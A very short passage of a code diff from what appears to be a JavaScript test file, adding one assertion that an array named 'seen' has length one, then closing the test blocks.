+    expect(seen).toHaveLength(1);
   });
 });
 
